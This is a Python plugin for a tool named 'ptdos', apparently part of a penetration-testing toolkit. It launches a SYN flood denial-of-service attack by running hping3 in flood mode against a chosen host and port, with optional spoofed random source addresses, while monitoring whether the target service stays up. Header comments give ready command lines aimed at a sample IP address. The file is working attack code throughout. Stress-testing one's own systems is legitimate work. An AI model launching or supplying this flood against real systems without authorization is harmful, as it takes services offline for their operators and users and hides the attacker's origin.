"""ptdos extension that adds a SYN Flood attack."""
# sudo python3 ptdos.py -a synflood -dst 192.168.0.80 -dp 80 -d 10 -dl 2048 -ss
# hping3 -S --flood -V -p 80 192.168.0.80

# own libs
from infrastructure import factory
from monitoring.ptcheckservice import attack_append_out_data, attack_checkservice_review, print_error
from ptlibs.ptmisclib import out_if, out_ifnot, ptprint, end_error
from misc.globalfuncs import is_tool
# external libs
from dataclasses import dataclass
from time import sleep, asctime
import subprocess


@dataclass
class SynFlood:

    category: str
    name: str

    def launch_attack(self, args, dst, duration, use_json, json_obj, json_no, monitoring, att_start_t_epoch, att_start_t_asc) -> None:
        """Main function responsible for launching the attack."""
        dstport = args['dstport']
        spoof_src = args['spoof-source']
        payload_len = args['datalength']

        if not dstport:
            end_error("Destination port is not specified.", json_no, json_obj, use_json)
            exit(1)

        hpingcmd = f"hping3 -S --flood -V -d {payload_len} -p {dstport} {dst}"

        if spoof_src:
            hpingcmd += " --rand-source"

        ptprint(out_ifnot(f"Used hping3 command: {hpingcmd}", "INFO", use_json))

        if not is_tool('hping3'):
            ptprint(out_ifnot("hping3 not found. Please install it or check availability in the PATH.", "ERROR", colortext=True))
            exit(0)
        else:
            ptprint(out_ifnot("hping3 found in the system. Proceeding...", "INFO", use_json))

        # checkservice start monitoring
        monitoringprocess = monitoring.call_checkservice_repeatedly(use_json)

        try:
            proc = subprocess.Popen(hpingcmd.split(), stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
            if proc.poll() is not None:
                ptprint(out_ifnot("Could not start hping", "INFO", use_json))  # print info to terminal
                err = proc.communicate()[1]
                ptprint(out_ifnot(f"{err}", "INFO", use_json))  # print info to terminal
                raise err
            sleep(duration)  # wait for duration seconds to finish hping3 attack
            proc.kill()
            proc.terminate()  # <-- terminate the process, ctrl+c in terminal
            monitoringprocess()  # stop checkservice end monitoring
            sleep(1)  # wait for 1 second to stop the monitoring process
            att_end_t_asc = asctime()  # save attack's ending time
            attack_checkservice_review(monitoring, use_json, json_obj, json_no, self.name)

            # append attack outcome data to JSON object or print info to console
            attack_append_out_data(use_json, json_obj, json_no, self.name, duration, att_start_t_asc, att_end_t_asc, dst, "hping3 used, packets could not be captured", dstport)

            # append checkservice outcome data to JSON object or print info to console
            monitoring.checkservice_append_out_data(json_obj, use_json, json_no)

            # print JSON object to console if self.use_json == TRUE
            ptprint(out_if(json_obj.get_all_json(), "", use_json))

            return

        except BaseException as err:
            monitoringprocess()  # stop checkservice end monitoring
            return print_error(json_obj, use_json, json_no, self.name, err.args[0])

    @staticmethod
    def make_help():
        """Help for attack printed out in main file ptdos.py."""
        return [
            {"SYN Flood attack options": [
                ["NOTE: Run this DoS with sudo."],
                ["-a", "--attack", "<attack>", "Attack name - synflood"],
                ["-d", "--duration", "<duration>", "Specify attack's duration in seconds. Default 10 seconds."],
                ["-dst", "--destination", "<dst>", "Specify destination IP or domain."],
                ["-dp", "--dstport", "<dstport>", "Specify destination port. Default 80."],
                ["-dl", "--data-length", "<datalength>", "Include len random bytes as payload. Default 1024 bytes."],
                ["-ss", "--spoof-source", "", "Spoof source IP address and port with fake values."]
            ]
            }
        ]

    @staticmethod
    def make_args(parser):
        """Specify arguments needed for the attack"""


def register() -> None:
    """Register attack in factory."""
    factory.register("synflood", SynFlood)
